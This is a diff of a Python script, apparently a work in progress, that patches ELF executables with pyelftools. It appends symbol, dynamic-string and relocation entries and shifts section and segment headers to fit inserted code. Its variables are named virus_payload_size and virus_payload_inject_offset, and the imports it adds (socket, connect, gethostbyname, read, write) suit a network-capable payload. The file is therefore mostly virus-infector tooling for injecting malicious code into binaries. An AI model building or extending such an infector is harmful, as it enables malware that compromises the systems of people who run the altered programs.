@@ -37,6 +37,8 @@ def edit_elf_section(elf_object,original_file,elf_section,section_index,size):
     total_section_offset_offset = section_header_table + section_header_size * section_index + section_offset_offset
     section_offset = elf_section['sh_offset'] 
     section_addr = elf_section['sh_addr']
+    #if section_index == 11:
+    #print("Section",section_index ,"increase offset by",hex(size))
     #changing offset
     modify_file(original_file,total_section_offset_offset,(size + section_offset).to_bytes(8,'little'))
     #changing virtual address
@@ -49,6 +51,13 @@ def get_indices_of_sections(elf_object,sections):
     return indices
 
 def get_total_increased_offset(indices,index,sizes):
+    size = 0
+    for j in range(len(indices)):
+        if index > indices[j]:
+            size+=sizes[j]
+    return size
+
+def get_total_increased_offset2(indices,index,sizes):
     size = 0
     for j in range(len(indices)):
         if index > indices[j]:
@@ -73,6 +82,13 @@ def edit_text_size(elf_object,original_file,size):
     total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
     modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))
 
+def get_program_header_size_ammount(indices,offset,p_header_size,section_sizes):
+    total_size = 0
+    for i in range(len(indices)):
+        if indices[i] >= offset and indices[i] < offset + p_header_size:
+            total_size+=section_sizes[i]
+    return total_size
+    
 
 def edit_program_header(elf_object,original_file,inject_offsets,sizes):
     program_header_offset = elf_object['e_phoff']
@@ -85,6 +101,12 @@ def edit_program_header(elf_object,original_file,inject_offsets,sizes):
     header_size = elf_object['e_phentsize']
     for i in range(num_segments):
         segment = elf_object.get_segment(i)
+
+        seg_size = get_program_header_size_ammount(inject_offsets,segment['p_offset'],segment['p_filesz'],sizes)
+        if i == 2:
+            print("seg_size",hex(seg_size))
+        modify_file(original_file,program_header_offset + i * header_size + filesz_offset,(segment['p_filesz']+seg_size).to_bytes(8,'little'))
+        modify_file(original_file,program_header_offset + i * header_size + memsz_offset,(segment['p_memsz']+seg_size).to_bytes(8,'little'))
         #if segment['p_offset'] > inject_offset:
         size = get_total_increased_offset(inject_offsets,segment['p_offset'],sizes)
         segment_offset = program_header_offset + i * header_size
@@ -140,7 +162,7 @@ def edit_dynamic_section(elf_object,original_file,inject_offsets,sizes):
     dynamic_section_offset = elf_object.get_section_by_name(".dynamic")['sh_offset']
     #print(dynamic_section_offset)
     dynamic_section = elf_object.get_section_by_name(".dynamic")
-    max_common_tag = 30
+    max_common_tag = 0xf00000006ffffff9
     value_offset = 8
     for i in range(dynamic_section.num_tags()):
         tag = dynamic_section._get_tag(i)
@@ -224,7 +246,7 @@ def edit_text_section_calls(elf_object,original_file,inject_offset,size):
                 if elf_object.get_section(i)['sh_offset'] >= offset and elf_object.get_section(i)['sh_offset'] < end:
                     edit_code_section(elf_object,original_file,elf_object.get_section(i)['sh_offset'],elf_object.get_section(i)['sh_size'],inject_offset,size)
 
-symbol_names = [ "htons@GLIBC_2.2.5", "memset@GLIBC_2.2.5", "close@GLIBC_2.2.5", "read@GLIBC_2.2.5", "gethostbyname@GLIBC_2.2.5","memcpy@GLIBC_2.14","connect@GLIBC_2.2.5","socket@GLIBC_2.2.5", "__stack_chk_fail@GLIBC_2.4","write@GLIBC_2.2.5","strlen@GLIBC_2.2.5"]
+
 
 
 
@@ -254,6 +276,39 @@ def insert_bytes_in_elf(elf_bytes, offset, bytes_to_insert):
     
     return bytes(elf_bytearray)
 
+symbol_names = [ "htons@GLIBC_2.2.5", "memset@GLIBC_2.2.5", "close@GLIBC_2.2.5", "read@GLIBC_2.2.5", "gethostbyname@GLIBC_2.2.5","memcpy@GLIBC_2.14","connect@GLIBC_2.2.5","socket@GLIBC_2.2.5", "__stack_chk_fail@GLIBC_2.4","write@GLIBC_2.2.5","strlen@GLIBC_2.2.5","usedforalign"]
+str_tab_entries = []
+def convert_functions_to_str_tab_entry():
+    str_tab_entries.clear()
+    for symbol in symbol_names:
+        for letter in symbol:
+            str_tab_entries.append(ord(letter))
+        str_tab_entries.append(0x0)
+    while len(str_tab_entries) % 16 != 0:
+        str_tab_entries.append(0x0)
+
+
+def get_str_index_of_added_function(offset,sym_name_index):
+    index = offset
+    for i in range(sym_name_index):
+        index = index + len(symbol_names[i]) + 1
+    return index
+
+def add_strings_to_dyn_str_tab(elf_object,file,offset):
+    sizes = []
+    for i in str_tab_entries:
+        sizes.append(1)
+    add_contents_to_file(offset,file,str_tab_entries,sizes)
+
+def add_functions_to_sym_tab(elf_object,file):
+    section = elf_object.get_section_by_name(".symtab")
+    offset = section['sh_offset'] + section['sh_size']
+    for i in range(len(symbol_names)):
+        name = 0x0
+        #print(hex(offset))
+        add_contents_to_file(offset,file,[name,0x12,0x0,0x0,0x0,0x0],[4,1,1,2,8,8])
+        offset+= section['sh_entsize']
+        
 
 def add_contents_to_file(offset,file,array_contents,array_sizes):
     for i in range(len(array_contents)):
@@ -276,6 +331,16 @@ def check_duplicate_symbols(elf_object):
             symbol_names.remove(sym_tab.get_symbol(i))
     #print(i,sym_tab.get_symbol(i)['st_name'],sym_tab.get_symbol(i).name)
 
+def add_functions_to_dyn_sym(elf_object,file,offset,size,dyn_str_inject_offset):
+    #section = elf_object.get_section_by_name(".dynsym")
+    #offset = section['sh_offset'] + section['sh_size']
+    for i in range(len(symbol_names)):
+        name = get_str_index_of_added_function(dyn_str_inject_offset,i)
+        print("Name:",hex(name))
+        #print(hex(offset))
+        add_contents_to_file(offset,file,[name,0x12,0x0,0x0,0x0,0x0],[4,1,1,2,8,8])
+        offset+= size
+
 def add_functions_to_sym_tab(elf_object,file):
     section = elf_object.get_section_by_name(".symtab")
     offset = section['sh_offset'] + section['sh_size']
@@ -287,16 +352,30 @@ def add_functions_to_sym_tab(elf_object,file):
 
 def add_functions_to_rela_plt(elf_object,file):
     section = elf_object.get_section_by_name(".rela.plt")
+    for i in range(section.num_relocations()):
+        print(section.get_relocation(i))
     offset = section['sh_offset'] + section['sh_size']
     for i in range(len(symbol_names)):
-        add_contents_to_file(offset,file,[0x0,0x0,0x0],[8,8,8])
+        add_contents_to_file(offset,file,[0x0,0x7,0x0],[8,8,8])
         offset+= section['sh_entsize']
+
+def edit_dyn_sym_section(elf_object,original_file,inject_offset,size):
+    section_header_table = elf_object['e_shoff']
+    section_header_size = elf_object['e_shentsize']
+    section_size_offset = 32
+    dyn_sym_index = elf_object.get_section_index('.dynsym')
+    dyn_sym_section = elf_object.get_section_by_name(".dynsym")
+    dyn_sym_section_size = dyn_sym_section['sh_size']
+    total_section_size_offset = section_header_table + section_header_size * dyn_sym_index + section_size_offset
+    #print(hex(text_section_size))
+    modify_file(original_file,total_section_size_offset,(dyn_sym_section_size+size).to_bytes(8,'little'))
+
 
 def edit_rela_plt_section(elf_object,original_file,inject_offset,size):
     section_header_table = elf_object['e_shoff']
     section_header_size = elf_object['e_shentsize']
     section_size_offset = 32
-    rela_plt_index = 11
+    rela_plt_index = elf_object.get_section_index('.rela.plt')
     rela_plt_section = elf_object.get_section_by_name(".rela.plt")
     rela_plt_section_size = rela_plt_section['sh_size']
     total_section_size_offset = section_header_table + section_header_size * rela_plt_index + section_size_offset
@@ -307,7 +386,7 @@ def edit_sym_tab_section(elf_object,original_file,size):
     section_header_table = elf_object['e_shoff']
     section_header_size = elf_object['e_shentsize']
     section_size_offset = 32
-    sym_tab_index = 28
+    sym_tab_index = elf_object.get_section_index('.symtab')
     sym_tab_section = elf_object.get_section_by_name(".symtab")
     sym_tab_section_size = sym_tab_section['sh_size']
     total_section_size_offset = section_header_table + section_header_size * sym_tab_index + section_size_offset
@@ -315,6 +394,18 @@ def edit_sym_tab_section(elf_object,original_file,size):
 
     modify_file(original_file,total_section_size_offset,(sym_tab_section_size+size).to_bytes(8,'little'))
 
+
+def edit_dyn_str_section(elf_object,original_file,size):
+    section_header_table = elf_object['e_shoff']
+    section_header_size = elf_object['e_shentsize']
+    section_size_offset = 32
+    dyn_str_index = elf_object.get_section_index('.dynstr')
+    dyn_str_section = elf_object.get_section_by_name(".dynstr")
+    dyn_str_section_size = dyn_str_section['sh_size']
+    total_section_size_offset = section_header_table + section_header_size * dyn_str_index + section_size_offset
+    #print(hex(text_section_size))
+
+    modify_file(original_file,total_section_size_offset,(dyn_str_section_size+size).to_bytes(8,'little'))
 
 virus_payload_size = 0x2fe
 virus_payload_inject_offset = 0x1169
@@ -340,32 +431,82 @@ inject_offset = virus_payload_inject_offset
 
 ##### Testing
 
+print('sh_link',elf.get_section(6)['sh_link'])
+section = elf.get_section(6)
+for i in range(section.num_symbols()):
+    print(section.get_symbol(i)['st_name'])
+
+
+
+########
+
+
 check_duplicate_symbols(elf)
+convert_functions_to_str_tab_entry()
+
+#.symtab
 section = elf.get_section_by_name(".symtab")
 sym_tab_inject_offset = section['sh_offset'] + section['sh_size'] #where the end of symble table is
 sym_tab_size = len(symbol_names) * section['sh_entsize'] #size of functions of add
-
+#.rela.plt
 section = elf.get_section_by_name(".rela.plt")
 plt_inject_offset = section['sh_offset'] + section['sh_size']
 rela_plt_size = len(symbol_names) * section['sh_entsize']
+#.dynsym
+section = elf.get_section_by_name(".dynsym")
+dyn_sym_inject_offset = section['sh_offset'] + section['sh_size']
+dyn_sym_size = len(symbol_names) * section['sh_entsize']
+#.dynstr
+section = elf.get_section_by_name(".dynstr")
+dyn_str_inject_offset = section['sh_offset'] + section['sh_size']
+dyn_str_size = len(str_tab_entries)
+print("dyn_str_inject_size: ",dyn_str_size)
+
+sym_tab_offset = elf.get_section_by_name(".symtab")['sh_offset']
+rela_plt_offset = elf.get_section_by_name(".rela.plt")['sh_offset']
+dyn_sym_offset = elf.get_section_by_name(".dynsym")['sh_offset']
+dyn_str_offset = elf.get_section_by_name(".dynstr")['sh_offset']
 
 
-elf_sections_changes = ['.symtab','.rela.plt']
-elf_sections_changes_sizes = [sym_tab_size,rela_plt_size]
-inject_offsets = [sym_tab_inject_offset,plt_inject_offset]
-
+section_offsets = [sym_tab_offset,rela_plt_offset,dyn_str_offset,dyn_sym_offset]
+elf_sections_changes = ['.symtab','.rela.plt','.dynstr','.dynsym']
+elf_sections_changes_sizes = [sym_tab_size,rela_plt_size,dyn_str_size,dyn_sym_size]
+print("SIZES",elf_sections_changes_sizes)
+inject_offsets = [sym_tab_inject_offset,plt_inject_offset,dyn_str_inject_offset,dyn_sym_inject_offset]
+#print("Inject offsets:")
+#for offset in inject_offsets:
+#    print(hex(offset))
 edit_symbol_table(elf,f,inject_offsets,elf_sections_changes_sizes)
-edit_program_header(elf,f,inject_offsets,elf_sections_changes_sizes)
-edit_dynamic_section(elf,f,inject_offsets,elf_sections_changes_sizes)
+edit_program_header(elf,f,section_offsets,elf_sections_changes_sizes)
+edit_dynamic_section(elf,f,section_offsets,elf_sections_changes_sizes)
 edit_rela_dyn_section(elf,f,inject_offsets,elf_sections_changes_sizes)
 edit_elf_sections(elf,f,elf_sections_changes,elf_sections_changes_sizes)
+
+
 edit_sym_tab_section(elf,f,sym_tab_size)
 edit_rela_plt_section(elf,f,inject_offsets,rela_plt_size)
-modify_file(f,40,(elf['e_shoff']+sym_tab_size+rela_plt_size).to_bytes(8,'little'))
+edit_dyn_str_section(elf,f,dyn_str_size)
+edit_dyn_sym_section(elf,f,inject_offsets,dyn_sym_size)
+modify_file(f,40,(elf['e_shoff']+sum(elf_sections_changes_sizes)).to_bytes(8,'little'))
+print("Num symbols to add ",len(symbol_names))
+dyn_sym_size = elf.get_section_by_name(".dynsym")['sh_entsize']
+dyn_sym_offset = elf.get_section_by_name(".dynsym")['sh_offset'] + elf.get_section_by_name(".dynsym")['sh_size']
 
 add_functions_to_sym_tab(elf,f)
 add_functions_to_rela_plt(elf,f)
+add_strings_to_dyn_str_tab(elf,f,dyn_str_inject_offset)
+add_functions_to_dyn_sym(elf,f,dyn_sym_offset,dyn_sym_size,dyn_str_inject_offset-dyn_str_offset)
 
+
+
+
+
+#### testing
+"""elf = ELFFile(open('hello','rb'))
+print('sh_link',elf.get_section(6)['sh_link'])
+section = elf.get_section(6)
+for i in range(section.num_symbols()):
+    print(section.get_symbol(i)['st_name'])"""
 
 """section = elf.get_section_by_name(".rela.plt")
 inject_offset = section['sh_offset'] + section['sh_size']
